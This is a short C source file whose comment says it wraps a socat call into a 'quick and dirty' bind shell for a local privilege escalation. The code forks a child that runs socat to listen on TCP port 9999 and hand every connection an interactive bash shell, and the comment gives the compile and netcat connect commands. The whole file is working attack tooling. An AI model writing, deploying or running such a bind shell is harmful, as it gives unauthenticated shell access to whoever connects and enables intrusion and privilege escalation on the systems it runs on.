/*
  forkn_shell_meh.cpp (say it with a bad brit accent!)
  
  Needed a quick and dirty bind shell for a local priv esc... The catch was I 
  couldn't pass params (which ruled out direct netcat/socat use)... So I wrapped 
  the socat call. Job done.

  $ gcc -o forkn_shell_meh forkn_shell_meh.cpp
  $ nc 127.0.0.1 9999
  $ ./forkn_shell_meh
*/

#include <stdio.h>
#include <unistd.h>

int main(int argc, char **argv);
int main(int argc, char **argv) {
  pid_t pid = fork();
  if (pid == 0) {
    // Child process... Just do the easiest thing.
    char* socat[] = {
      "socat",
      "tcp-listen:9999",
      "exec:bash",
      NULL
    };

    execvp("/usr/local/bin/socat", socat);
  }

  return 0;
}

